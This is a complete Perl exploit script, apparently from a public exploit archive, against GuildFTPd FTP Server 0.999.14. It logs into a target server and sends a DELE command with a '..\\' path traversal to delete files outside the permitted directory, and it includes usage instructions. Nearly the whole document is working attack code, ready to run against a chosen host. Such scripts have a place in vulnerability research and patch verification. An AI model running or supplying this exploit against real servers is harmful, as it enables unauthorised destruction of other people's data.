#!/usr/bin/perl
# Exploit: GuildFTPd FTP Server Version 0.999.14 Remote Delete Files
# download module: http://www.infos-du-net.com/telecharger/GuildFTPD,0301-3342.html
# 
# The vulnerability is located in the syntax "..\", it can delete a file int he subdirectory
# Syntax in a console => DEL ..\test.txt
#
# Author: Jonathan Salwan
# Mail: js.rac.projet [AT] gmail.com
# Web: http://racprojet.zapto.org


use IO::Socket;
print "[+] Author : Jonathan Salwan \n";
print "[+] Soft: Guild FTP Server V0.999.14\n";
print "[+] Exploit: Remote Delete File\n";

	if (@ARGV < 5)
		{
 		print "[*] Usage: <guildftp.pl> <host> <port> <login> <password> <file>\n";
 		print "[*] Exemple: guildftp.pl 127.0.0.1 21 jonathan salwan ..\\\\test.txt\n";
 		exit;
		}

	$ip = $ARGV[0];
	$port = $ARGV[1];
	$user = $ARGV[2];
	$pass = $ARGV[3];
	$file = $ARGV[4];

$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port") || die "\n[-] Connecting: Failed!\n";

print "\n[+] Connecting: Ok!\n";
print "[+] Sending request...\n";

	print $socket "USER $user\n";
	print $socket "PASS $pass\n";
	print $socket "DELE $file\n";

		sleep(5);
		close($socket);

print "[+] Terminate || By Jonathan Salwan \n";

